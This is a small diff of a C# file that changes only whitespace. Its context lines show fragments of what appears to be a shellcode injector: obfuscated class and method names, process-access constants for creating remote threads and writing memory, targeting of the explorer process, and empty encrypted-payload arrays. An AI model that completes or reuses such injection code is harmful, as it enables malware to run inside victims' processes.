@@ -44,7 +44,7 @@ public class ClassExample
         public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
 		
-		const int PROCESS_CREATE_THREAD = 0x0002;
+	const int PROCESS_CREATE_THREAD = 0x0002;
         const int PROCESS_QUERY_INFORMATION = 0x0400;
         const int PROCESS_VM_OPERATION = 0x0008;
         const int PROCESS_VM_WRITE = 0x0020;
@@ -60,7 +60,7 @@ public class ClassExample
             LHUemjWIqy.uOYYm.RQNFbPpTg("100");
             Process[] expProc = Process.GetProcessesByName("explorer");
             int procPid = expProc[0].Id;
-	        uint infiniteTimeout = 0xFFFFFFFF;
+	    uint infiniteTimeout = 0xFFFFFFFF;
             byte[] passwordBytes = new byte[] { };
             byte[] saltBytes = new byte[] { };
             byte[] encryptedraw = new byte[] { };
